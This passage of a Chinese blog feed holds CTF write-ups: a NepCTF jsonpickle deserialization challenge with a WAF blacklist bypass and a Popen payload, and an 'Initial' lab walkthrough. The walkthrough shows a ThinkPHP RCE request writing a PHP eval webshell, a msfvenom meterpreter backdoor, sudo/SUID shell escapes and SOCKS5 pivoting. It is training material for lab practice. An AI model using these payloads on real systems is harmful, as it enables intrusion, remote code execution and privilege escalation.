render_template<span class="token punctuation">(</span><span class="token string">'error.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"访问被拒绝。只有管理员才能查看此页面。"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'vault.html'</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token string">"NepCTF{fake_flag_this_is_not_the_real_one}"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'about.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/BackingStar/p/10986775.html">python 清空list的几种方法 - BackingStar - 博客园</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jsonpickle<span class="token punctuation">,</span> json<span class="token punctuation">,</span> os<span class="token keyword">class</span> <span class="token class-name">Session</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> meta<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>meta <span class="token operator">=</span> meta<span class="token comment"># 黑名单列表</span>FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'Popen'</span><span class="token punctuation">,</span> <span class="token string">'nt'</span><span class="token punctuation">,</span>    <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'reduce'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'command'</span><span class="token punctuation">,</span> <span class="token string">'pty'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'pdb'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">'marshal'</span><span class="token punctuation">,</span>    <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'threading'</span><span class="token punctuation">,</span> <span class="token string">'multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'signal'</span><span class="token punctuation">,</span> <span class="token string">'traceback'</span><span class="token punctuation">,</span> <span class="token string">'inspect'</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span>    <span class="token string">'render_template'</span><span class="token punctuation">,</span> <span class="token string">'jsonpickle'</span><span class="token punctuation">,</span> <span class="token string">'cgi'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'shutil'</span><span class="token punctuation">,</span> <span class="token string">'state'</span><span class="token punctuation">,</span>    <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'ctypes'</span><span class="token punctuation">,</span> <span class="token string">'timeit'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">,</span> <span class="token string">'jinja2'</span><span class="token punctuation">,</span> <span class="token string">'re'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span>    <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">,</span> <span class="token string">'uuid'</span><span class="token punctuation">,</span>    <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__globals__'</span><span class="token punctuation">,</span> <span class="token string">'__code__'</span><span class="token punctuation">,</span> <span class="token string">'__closure__'</span><span class="token punctuation">,</span> <span class="token string">'__func__'</span><span class="token punctuation">,</span> <span class="token string">'__self__'</span><span class="token punctuation">,</span> <span class="token string">'pydoc'</span><span class="token punctuation">,</span>    <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span> <span class="token string">'__mro__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasses__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bad <span class="token keyword">for</span> bad <span class="token keyword">in</span> FORBIDDEN <span class="token keyword">if</span> bad <span class="token keyword">in</span> payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token comment"># 修正后的 payload（关键：指定 __main__ 模块路径）</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""{    "py/object": "__main__.Session",     "meta": {        "user": {            "py/object": "__main__.FORBIDDEN.clear",            "py/newargsex":[[],{}]        },        "ts": 1753446254    }}"""</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment"># 检查 WAF 是否拦截</span>    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"WAF 拦截 payload"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 反序列化</span>        sess_obj <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"反序列化后的 meta.user 类型："</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>sess_obj<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 应显示为 &lt;class 'builtin_function_or_method'&gt;</span>        <span class="token comment"># 调用 clear 方法</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用前 FORBIDDEN 长度："</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>FORBIDDEN<span class="token punctuation">)</span><span class="token punctuation">)</span>        sess_obj<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 现在可以正常调用了</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用后 FORBIDDEN 长度："</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>FORBIDDEN<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出 0，说明已清空</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"错误："</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"__main__.Session"</span><span class="token punctuation">,</span> <span class="token property">"meta"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"user"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"subprocess.Popen"</span><span class="token punctuation">,</span> <span class="token property">"py/newargsex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"mkdir static;/readflag &gt; static/1.txt"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"ts"</span><span class="token operator">:</span><span class="token number">1753446254</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/9513f7a8ea3dbcaba0024e8423798cc0.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Initial</title>
      <link href="/2025/08/04/initial/"/>
      <url>/2025/08/04/initial/</url>
      
        <content type="html"><![CDATA[<h1 id="Initial"><a href="#Initial" class="headerlink" title="Initial"></a>Initial</h1><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>先用fscan扫一下</p><pre class="line-numbers language-none"><code class="language-none">./fscan  -h 39.99.138.127 -nobr(-nobr设置不爆破弱口令)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a1b2e831814a8b69d9c33539ec6f9a20.png"></p><h2 id="172-22-1-15"><a href="#172-22-1-15" class="headerlink" title="172.22.1.15"></a>172.22.1.15</h2><p>扫出来有poc-yaml-thinkphp5023-method-rce poc1</p><p><a href="https://www.cnblogs.com/--kisaragi--/p/15315131.html">【RCE | BUUCTF】ThinkPHP 5.0.23 远程代码执行漏洞复现 - –Kisaragi– - 博客园</a></p><pre class="line-numbers language-none"><code class="language-none">POST /index.php?s=captcha HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id #传入的参数echo '&lt;?php eval(\$_POST[cmd]); ?&gt;' &gt; /var/www/html/webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/33a037b8aecd71c4f6cbdcc00673d9d5.png"></p><h4 id="msf连接"><a href="#msf连接" class="headerlink" title="msf连接"></a>msf连接</h4><p>但是蚁剑的shell不好用，用msf再建立一个连接，也方便后续流量转发。因为我们已知公网ip，于是用正向shell.</p><p>先本地生成一个正向shell的64位后门</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7654 -f elf -o 7.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将<code>7.elf</code>拖到蚁剑上然后赋权</p><pre class="line-numbers language-none"><code class="language-none">chmod +x 7.elf     +x 表示给所有用户（所有者、所属组、其他用户）添加可执行权限(777过就不用了)chmod +x filename（给所有用户添加执行权限）chmod u+x filename（只给所有者添加执行权限）chmod g+x filename（只给所属组添加执行权限）chmod 777 7.elf./7.elf777 是数字权限表示法，三个数字分别对应文件所有者、所属组用户和其他用户的权限每个数字的含义：4 代表读权限（r），2 代表写权限（w），1 代表执行权限（x）7 是 4+2+1 的总和，表示同时拥有读、写、执行三种权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着用msf即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span class="token comment">#加载 Metasploit 的 "多用途处理器" 模块，这是一个监听模块，用于接收来自#目标主机的反向连接或绑定连接。</span><span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcp<span class="token comment">#设置攻击载荷（payload）为linux/x64/meterpreter/bind_tcp：</span><span class="token comment">#linux/x64：针对 64 位 Linux 系统</span><span class="token comment">#meterpreter：一种高级交互式 shell，提供文件操作、进程控制等功能</span><span class="token comment">#bind_tcp：绑定连接模式（目标主机开放端口等待攻击者连接，与反向连接#reverse_tcp对应）</span><span class="token builtin class-name">set</span> rhost <span class="token number">39.99</span>.138.127<span class="token comment">#设置rhost（远程主机）为目标 IP 地址，即要连接的受害主机 IP。</span><span class="token builtin class-name">set</span> lport <span class="token number">4567</span><span class="token comment">#在bind_tcp模式下，lport实际是目标主机开放的端口（攻击者将连接到该端口）。</span>run<span class="token comment">#执行监听，等待与目标主机的bind_tcp载荷建立连接，成功后获得 #meterpreter 会话。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即可创meterpreter 会话。</p><p>传完后来拿flag.</p><p>先</p><pre class="line-numbers language-none"><code class="language-none">sudo -lMatching Defaults entries for www-data on ubuntu-web01:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on ubuntu-web01:    (root) NOPASSWD: /usr/bin/mysql    当前 www-data 用户在 ubuntu-web01 主机上拥有以下 sudo 权限：可以以 root 用户身份执行 /usr/bin/mysql 命令；NOPASSWD 标志表示执行该命令时不需要输入密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7c98e05d1c11fd31051aa146eed0a857.png"></p><pre class="line-numbers language-none"><code class="language-none">sudo mysql -e '\! find / -name flag*'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li><p>以 root 权限启动 MySQL 客户端（因为 <code>www-data</code> 用户有 NOPASSWD 权限执行 <code>mysql</code>）</p></li><li><p>在 MySQL 客户端中执行 <code>\!</code> 命令，这会调用系统 shell 执行后面的命令</p></li><li><p>实际执行的系统命令是 <code>find / -name flag*</code>（全局查找文件名以 flag 开头的文件）</p></li><li><p>在 MySQL 客户端中，<code>-e</code> 是执行命令的参数，用于在非交互式模式下运行 MySQL 命令并退出。</p><p>而 <code>\!</code> 是 MySQL 客户端中的一个特殊命令，作用是<strong>执行系统 shell 命令</strong></p></li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c6d3a998cf84caba53627679ff7dc622.png"></p><pre class="line-numbers language-none"><code class="language-none">sudo mysql -e '\! cat /root/flag/flag01.txt'flag{60b53231-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h5><p><code>sudo</code>（Superuser Do）是 Linux 系统中用于以其他用户身份（通常是 root 身份）执行命令的工具 ，其核心配置文件为 <code>/etc/sudoers</code> ，管理员可通过 <code>visudo</code> 命令（安全编辑该文件，可避免语法错误导致权限问题）进行权限分配。比如配置 <code>user1 ALL=(root) NOPASSWD: /usr/bin/apt-get</code> ，意味着用户 <code>user1</code> 无需输入密码，就能以 root 权限执行 <code>apt-get</code> 命令 。</p><p>当发现某用户克用sudo运行某些命令，可以利用这些命令提权到root</p><pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/vim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果vim可以用sudo运行，就能在vim里执行<code>:!sh</code>获取root shell</p><h5 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h5><p>原理：SUID（Set User ID），是一种文件权限位，允许普通用户以文件拥有者（通常是 root）的身份执行该程序。SUID 权限标志为 s，例如 -rwsr - xr - x。只需执行程序，无需输入密码。</p><p>利用方式：先查找系统中的 SUID 文件 find /-perm - 4000 2 &gt; /dev/null，</p><p>如果某些程序（如 python、vim、perl、find、bash 等）具有 SUID，并且本身可逃逸为 shell，则普通用户运行时会直接获得 root 权限。比如，若 /usr/bin/vim 有 SUID 权限，你用普通用户运行 vim，执行 :!sh，就是 root shell；也可以利用 SUID 程序的漏洞提权（比如 SUID 的 C 程序有命令注入）。</p><p>例如，系统中的 <code>/bin/passwd</code> 文件，其所有者是 root，并且设置了 SUID 权限。普通用户执行 <code>passwd</code> 命令来修改自己的密码时，实际上是以 root 权限来访问和修改 <code>/etc/shadow</code> 文件（该文件只有 root 用户才有读和写的权限） ，从而实现密码修改。</p><p>检测方法:</p><p>在 Linux 系统中，可以使用以下命令来查找设置了 SUID 权限的文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，<code>/</code> 表示从根目录开始查找；<code>-perm -u=s</code> 用于筛选出设置了 SUID 权限的文件；<code>-type f</code> 限定查找的对象是普通文件；<code>2&gt;/dev/null</code> 则是将错误信息（比如没有权限访问某些目录而产生的报错）重定向到 <code>/dev/null</code> ，即忽略错误信息。</p><h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><ul><li><p>利用可逃逸为 shell 的程序</p><p>：如果某些常见程序（如 <code>vim</code>、<code>find</code>、<code>bash</code>、<code>perl</code>、<code>python</code> 等）被设置了 SUID 权限，并且这些程序具备一定的特性，能让用户从中逃逸并获取到具有高权限的 shell，就可以实现提权。</p><ul><li><strong><code>vim</code> 示例</strong>：当 <code>/usr/bin/vim</code> 拥有 SUID 权限时，普通用户打开 vim，然后执行 <code>:!sh</code> ，就能得到一个 root 权限的 shell。这是因为 vim 在执行外部命令时，会继承自身的权限，而此时 vim 具有 root 的 SUID 权限，所以执行的 shell 也拥有 root 权限。</li><li><strong><code>find</code> 示例</strong>：当 <code>find</code> 程序被设置了 SUID 权限，普通用户可以执行类似这样的命令 <code>find . -exec /bin/sh \; -quit</code> 。<code>find</code> 命令的 <code>-exec</code> 选项可以让它在找到的文件上执行指定的命令，这里执行 <code>/bin/sh</code> ，由于 <code>find</code> 具备 SUID 权限，从而得到 root 权限的 shell。</li></ul></li></ul><table><thead><tr><th></th><th>sudo 提权</th><th>SUID 提权</th></tr></thead><tbody><tr><td>配置</td><td>由 /etc/sudcers 管理</td><td>由文件权限（SUID 位）管理</td></tr><tr><td>认证</td><td>通常需要密码（或 NOPASSWD）</td><td>不需要密码</td></tr><tr><td>入口</td><td>用 sudo 执行指定命令</td><td>直接执行 SUID 程序</td></tr><tr><td>灵活性</td><td>sudoers 精细控制命令粒度</td><td>SUID 只控制程序本身</td></tr><tr><td>安全性</td><td>更安全，日志健全</td><td>一旦配置错误风险极大</td></tr><tr><td>常见利用</td><td>sudo 结合能逃逸的程序</td><td>SUID 结合能逃逸的程序</td></tr></tbody></table><hr><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><pre class="line-numbers language-none"><code class="language-none">看一下网段ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255        inet6 fe80::216:3eff:fe16:c270  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:3e:16:c2:70  txqueuelen 1000  (Ethernet)        RX packets 697240  bytes 381845267 (381.8 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 534548  bytes 209973517 (209.9 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 35960  bytes 16528880 (16.5 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 35960  bytes 16528880 (16.5 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可看到是172.22.1.15。</p><p>上传fscan</p><pre class="line-numbers language-none"><code class="language-none">chmod +x fscan./fscan -h 172.22.1.0/24 &gt;mao.txt         (默认是在result.txt)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>在 <code>./fscan -h 172.22.1.0/24 &gt;mao.txt</code> 这个命令里，<code>172.22.1.0/24</code> 是一种<strong>CIDR（无类别域间路由，Classless Inter-Domain Routing）表示法</strong>，用于标识一个 IP 地址段 ，具体含义如下：</p><p><code>172.22.1.0</code> 是这个网段的<strong>网络地址</strong> ，它是该网段的起始标识，在网络中代表这个特定的网络区域。</p><p><code>/24</code> 表示子网掩码中<strong>二进制的 1 的位数</strong> 。在 IPv4 地址中，IP 地址由 32 位二进制数组成，子网掩码用于区分网络地址和主机地址 。</p><ul><li><p><strong>子网掩码换算</strong>：<code>/24</code> 意味着子网掩码中有 24 个 1，8 个 0 ，用点分十进制表示就是 <code>255.255.255.0</code> 。</p></li><li><p>可分配主机地址范围计算</p><p>：</p><ul><li>对于 <code>172.22.1.0/24</code> 这个网段，网络地址是 <code>172.22.1.0</code> ，广播地址是通过将主机位全部置为 1 得到，即 <code>172.22.1.255</code> 。</li><li>可用于分配给主机（如服务器、电脑、网络设备等）的 IP 地址范围是 <code>172.22.1.1</code> 到 <code>172.22.1.254</code> ，一共可以容纳 <code>2^(32 - 24) - 2 = 254</code> 个主机地址 。减去 2 是因为要去掉网络地址和广播地址，它们不能分配给具体的主机使用。</li></ul></li></ul><p>在 <code>fscan</code> 这款综合扫描工具中，使用 <code>172.22.1.0/24</code> ，就表示让 <code>fscan</code> 对 <code>172.22.1.1</code> 到 <code>172.22.1.254</code> 这个范围内的所有 IP 地址进行扫描 ，扫描结果会通过 <code>&gt;</code> 重定向到 <code>mao.txt</code> 文件中保存。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2      is alive  DC域控(icmp) Target 172.22.1.21     is alive   MS17-010永恒之蓝(icmp) Target 172.22.1.15     is alive   本体(icmp) Target 172.22.1.18     is alive   信呼OA系统[*] Icmp alive hosts len is: 4172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:3306 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.21:135 open172.22.1.2:135 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.2:88 open172.22.1.15:8001 open172.22.1.15:22 open[*] alive ports len is: 15start vulscan[*] NetInfo [*]172.22.1.2   [-&gt;]DC01   [-&gt;]172.22.1.2[*] NetInfo [*]172.22.1.18   [-&gt;]XIAORANG-OA01   [-&gt;]172.22.1.18[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)[*] NetInfo [*]172.22.1.21   [-&gt;]XIAORANG-WIN7   [-&gt;]172.22.1.21[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1已完成 15/15[*] 扫描结束,耗时: 15.122671303s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>后门端口从54522开始，流量转发端口从55555开始</p></blockquote><h3 id="socks5流量转发"><a href="#socks5流量转发" class="headerlink" title="socks5流量转发"></a>socks5流量转发</h3><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/tools/Stotaway-bin/Stotaway-bin"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用stowaway开一个stocks5服务。让ubuntu上的流量通过“stowaway”走到172.22.1.15，只要再配置好浏览器代理，我们就可以访问172.22.1.15同一内网下别的主机提供的web服务了。同理，蚁剑，msf等攻击流量也可以走socks5，攻击内网里其他主机。</p><pre class="line-numbers language-none"><code class="language-none">topouse 0socks 12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是在ubuntu开了123456的socks服务器，然后转发到0上，因此还需对浏览器/蚁剑/proxychains设置代理，将攻击流量转到12345端口。</p><pre class="line-numbers language-none"><code class="language-none">vim /etc/proxychains4.confsocks5  127.0.0.1 12345（要注释掉不需要的代理）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>测试链接：</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 curl -v http://172.22.1.18/?m=login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功返回网页html的话，说明流量转发成功。</p><pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.99.138.127:7879 -s 123chmod +x 文件名                                  增加权限chmod 777 文件名                                   给所有用户加权限/var/www/html/linux_x64_agent -l 7879 -s 123topouse 0helpforward 8084 172.22.1.18:80（映射）<span aria-hidden="true" 